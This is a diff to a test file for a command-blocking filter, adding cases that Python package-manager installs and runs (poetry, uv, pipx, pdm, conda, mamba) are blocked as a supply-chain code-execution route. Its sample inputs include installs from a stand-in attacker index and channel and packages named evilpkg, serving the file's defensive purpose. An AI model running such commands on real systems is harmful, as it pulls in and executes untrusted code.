@@ -495,6 +495,33 @@ describe('FN-LT-001 — Add/Remove-MpPreference is blocked', () => {
     assertNotBlocked('Get-MpPreference'));
 });
 
+// ─── FN-LT-002 — modern Python package managers (poetry/uv/pipx/pdm) ─────────
+// pip install was already caught; verb-different sister tools were not. Each
+// executes pyproject.toml build scripts on install (same RCE surface as
+// pip install -e .). Supply-chain typosquats land here.
+describe('FN-LT-002 — poetry/uv/pipx/pdm install/add/update is blocked', () => {
+  it('blocks poetry add', () => assertBlocked('poetry add --dev typosquat-pkg'));
+  it('blocks poetry install', () => assertBlocked('poetry install'));
+  it('blocks poetry update', () => assertBlocked('poetry update'));
+  it('blocks poetry run script', () => assertBlocked('poetry run python evil.py'));
+  it('blocks pipx install', () => assertBlocked('pipx install --pip-args="--extra-index-url=http://attacker/" pkg'));
+  it('blocks pdm add', () => assertBlocked('pdm add evilpkg'));
+  it('blocks pdm install', () => assertBlocked('pdm install'));
+  it('blocks conda install', () => assertBlocked('conda install -c attacker-channel pkg'));
+  it('blocks mamba install', () => assertBlocked('mamba install -n base evilpkg'));
+  it('blocks uv pip install', () => assertBlocked('uv pip install evilpkg'));
+  it('blocks uv add', () => assertBlocked('uv add evilpkg'));
+  it('blocks uv sync', () => assertBlocked('uv sync'));
+  it('blocks uv run', () => assertBlocked('uv run python -c "import os"'));
+  it('blocks uv tool install', () => assertBlocked('uv tool install evilpkg'));
+
+  // Read-only forms still allowed.
+  it('still allows poetry --version', () => assertNotBlocked('poetry --version'));
+  it('still allows poetry show', () => assertNotBlocked('poetry show'));
+  it('still allows poetry env list', () => assertNotBlocked('poetry env list'));
+  it('still allows uv --version', () => assertNotBlocked('uv --version'));
+});
+
 // ─── FP-LT-001 — narrow cmd `set` rule to allow assignment form ───────────────
 // The prior `set` rule was overbroad: any `set <ANYTHING>` form including the
 // legitimate assignment `set NODE_OPTIONS=--max-old-space-size=4096` was RED.
